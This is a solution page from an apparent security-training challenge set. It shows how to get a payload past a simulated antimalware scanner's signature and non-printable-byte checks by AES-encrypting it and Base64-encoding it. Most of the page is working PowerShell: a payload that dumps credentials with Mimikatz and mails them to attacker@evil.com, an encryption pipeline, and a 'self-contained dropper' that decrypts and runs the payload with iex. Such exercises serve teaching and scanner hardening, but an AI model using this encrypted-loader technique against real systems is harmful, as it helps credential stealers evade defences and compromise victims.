---
title: "Solution 18: Encrypted Payload"
challenge_number: 18
difficulty: medium
category: "Non-Printable Ratio Bypass"
permalink: /solutions/18-encrypted-payload/
---

# Solution: Encrypted Payload

[Back to Challenge](../challenges/18-encrypted-payload.md)

## Overview

AES-encrypt the malicious payload to destroy all signatures, then Base64-encode the ciphertext for disk storage. The encryption eliminates signature matches; the Base64 encoding keeps the non-printable ratio at 0%. The entropy check fires (>7.2) but only issues a non-blocking warning.

## Working Code

### Full Encryption + Encoding Pipeline

```powershell
# ===== STEP 1: Prepare the malicious payload =====
# This contains signature words that would normally be detected
$maliciousPayload = @"
Invoke-Mimikatz -DumpCreds
$creds = Get-Credential
Send-MailMessage -To attacker@evil.com -Body $creds
"@

# ===== STEP 2: Generate AES key and IV =====
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.GenerateKey()
$aes.GenerateIV()

# ===== STEP 3: Encrypt the payload =====
$encryptor = $aes.CreateEncryptor()
$payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($maliciousPayload)
$encryptedBytes = $encryptor.TransformFinalBlock($payloadBytes, 0, $payloadBytes.Length)

# ===== STEP 4: Base64 encode for disk storage =====
$keyB64 = [Convert]::ToBase64String($aes.Key)
$ivB64 = [Convert]::ToBase64String($aes.IV)
$dataB64 = [Convert]::ToBase64String($encryptedBytes)

# ===== STEP 5: Write the final file (100% printable ASCII) =====
$fileContent = @"
# Configuration data
`$k = "$keyB64"
`$i = "$ivB64"
`$d = "$dataB64"
"@

Set-Content -Path "encrypted_payload.ps1" -Value $fileContent
Write-Host "File written. All content is printable ASCII."
```

### The File on Disk (Example Output)

```powershell
# Configuration data
$k = "X7h2Kp9mN4vQ1wR8tY6uI3oP5sA0dF7gH2jL4zC9xB="
$i = "M3nB8vC2xZ6qW1eR4tY7uI="
$d = "aGVsbG8gd29ybGQgdGhpcyBpcyBlbmNyeXB0ZWQgZGF0YQ=="
```

No signatures visible. No non-printable bytes. 100% printable ASCII.

### Runtime Decryption Script

```powershell
# ===== Runtime: Decrypt and execute =====
# (This would be in a separate loader, or appended to the file above)

$k = "X7h2Kp9mN4vQ1wR8tY6uI3oP5sA0dF7gH2jL4zC9xB="  # AES key
$i = "M3nB8vC2xZ6qW1eR4tY7uI="                         # IV
$d = "aGVsbG8gd29ybGQgdGhpcyBpcyBlbmNyeXB0ZWQgZGF0YQ==" # Ciphertext

# Decode from Base64
$keyBytes = [Convert]::FromBase64String($k)
$ivBytes = [Convert]::FromBase64String($i)
$encData = [Convert]::FromBase64String($d)

# Decrypt
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $keyBytes
$aes.IV = $ivBytes
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

$decryptor = $aes.CreateDecryptor()
$decryptedBytes = $decryptor.TransformFinalBlock($encData, 0, $encData.Length)
$plaintext = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)

# Execute the decrypted payload
Invoke-Expression $plaintext
```

### Complete Self-Contained Dropper

```powershell
# This entire file is printable ASCII on disk - no signatures, no non-printable bytes
# The scanner sees variable assignments with Base64 strings - nothing malicious

$key = "vGhP4RzN8mK2xQ6wT1yU3iO5pA7sD9fJ0lB4cE2hX8w="
$iv  = "qW3eR5tY7uI9oP1aS3dF5g=="
$enc = "kN8Hj2Lm5Qr7Vx0By3Cw6Fz9Ah4Dk1Gn0Ip3Ls6Ou9Pw2Rx5St8Uv1Wy4Zb7Ce0Fg3Hi6Jk9Lm2No5Pq8Rs1Tu4Vw7Xy0Za3Bc6De9Fg2Hi5Jk8Lm1No4Pq7Rs0Tu3Vw6Xy9Za2Bc5De8Fg1Hi4Jk7Lm0No3Pq6Rs9Tu2Vw5Xy8Za1Bc4De7Fg0Hi3Jk6Lm9No2Pq5Rs8Tu1Vw4Xy7Za0Bc3De6Fg9Hi2Jk5Lm8=="

# Runtime decryption
$aesObj = [System.Security.Cryptography.Aes]::Create()
$aesObj.Key = [Convert]::FromBase64String($key)
$aesObj.IV = [Convert]::FromBase64String($iv)
$aesObj.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aesObj.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$dec = $aesObj.CreateDecryptor()
$raw = [Convert]::FromBase64String($enc)
$plain = [System.Text.Encoding]::UTF8.GetString($dec.TransformFinalBlock($raw, 0, $raw.Length))
iex $plain
```

## Why It Works

This solution defeats **two** scanner checks simultaneously:

### 1. Signature Detection: Defeated by Encryption

AES encryption transforms plaintext into pseudorandom ciphertext. The relationship between input and output bytes is completely destroyed:

```
Input:  "Invoke-Mimikatz" → bytes: 49 6E 76 6F 6B 65 2D 4D ...
Output: (random bytes)    → bytes: A3 7F 12 E8 5C 91 D4 0B ...
```

The scanner searches for signature strings as contiguous byte sequences. After encryption, no recognizable signatures exist in the data. Without the key, the original bytes are computationally infeasible to recover from the ciphertext.

### 2. Non-Printable Ratio: Defeated by Base64 Encoding

Raw AES ciphertext is essentially random bytes — roughly 99.6% would be non-printable. This would trigger the 40% ratio check. The solution: Base64-encode the ciphertext before writing to disk.

```
AES output:  A3 7F 12 E8 5C 91 D4 0B  → ~100% non-printable
Base64:      "o38S6FyR1As="            → 0% non-printable
```

### 3. Entropy Check: Triggered but Non-Blocking

Base64-encoded encrypted data has Shannon entropy around 5.9-6.0 bits/byte (Base64 uses 64 chars out of 256 possible byte values). However, even if entropy exceeds 7.2, the scanner only issues a **warning** using `discard` — it does not block the file:

```nim
if entropy > 7.2:
    discard  # Warning only, does not flag as malicious
```

### Defense-in-Depth Failure

The scanner would need ALL of the following to detect this:
1. Recognize Base64 encoding → it doesn't parse encoding schemes
2. Decode the Base64 → it doesn't transform content
3. Recognize AES ciphertext → it doesn't identify crypto
4. Possess the key and decrypt → impossible without the key
5. Then scan the plaintext → never reached

Each layer is independently sufficient to prevent detection.

## How to Verify

1. Create the encrypted payload file:
   ```powershell
   $payload = "This contains malware and trojan signatures"
   $aes = [System.Security.Cryptography.Aes]::Create()
   $aes.GenerateKey(); $aes.GenerateIV()
   $enc = $aes.CreateEncryptor()
   $pb = [System.Text.Encoding]::UTF8.GetBytes($payload)
   $ct = $enc.TransformFinalBlock($pb, 0, $pb.Length)
   $content = "`$k = `"$([Convert]::ToBase64String($aes.Key))`"`n`$i = `"$([Convert]::ToBase64String($aes.IV))`"`n`$d = `"$([Convert]::ToBase64String($ct))`""
   Set-Content -Path "test_encrypted.ps1" -Value $content
   ```

2. Verify non-printable ratio is 0%:
   ```powershell
   $bytes = [System.IO.File]::ReadAllBytes("test_encrypted.ps1")
   $np = ($bytes | Where-Object { $_ -lt 0x20 -or $_ -gt 0x7E }).Count
   # Excluding newlines (0x0A, 0x0D) which the scanner may treat as printable
   Write-Host "Non-printable (strict): $np / $($bytes.Length)"
   ```

3. Verify no signatures are present:
   ```powershell
   $text = Get-Content "test_encrypted.ps1" -Raw
   Write-Host "Contains 'malware': $($text -match 'malware')"
   Write-Host "Contains 'trojan': $($text -match 'trojan')"
   # Both: False
   ```

4. Run the scanner:
   ```
   nim_antimalware_sim.exe test_encrypted.ps1
   ```

5. Expected result: **No detection** — no signatures found, non-printable ratio is 0%. An entropy warning may appear but does not cause the file to be flagged as malicious.
